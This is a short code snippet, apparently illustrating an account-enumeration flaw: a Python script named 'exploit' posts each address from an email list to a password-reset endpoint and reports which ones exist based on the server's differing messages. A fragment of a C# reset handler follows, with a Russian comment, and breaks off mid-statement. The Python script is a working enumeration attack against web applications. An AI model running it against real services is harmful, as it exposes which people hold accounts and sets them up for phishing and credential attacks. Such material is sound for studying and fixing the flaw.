```Python
import requests
from pathlib import Path  
  
targ_url = "http://app.com/api/user/password/request"  
emailList = Path("emails.txt").read_text().splitlines()


def exploit():  
	
    for i in emailList:  
        try:   
            response = requests.post(targ_url, json={"email": i})  
  
            if response.json()["message"] == "Reset email has been sent.":  
                print(f"Found email: {i}")   
            elif response.json()["message"] == "Requested user does not exist!":  
                continue  

        except Exception as e:  
            print(f"Error {e}")  

  
if __name__ == "__main__":  
    exploit()
```

```C#
[HttpPost("password/request")]  
public async Task<IActionResult> RequestReset([FromBody] PasswordResetRequest req)  
{  
    var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32))
    var tokenTTL = DateTime.UtcNow.AddHours(1);
      
    //одним запросом и обновляем и ищем пользователя
    var update = await _db.Users.ExecuteSqlRawAsync(
```
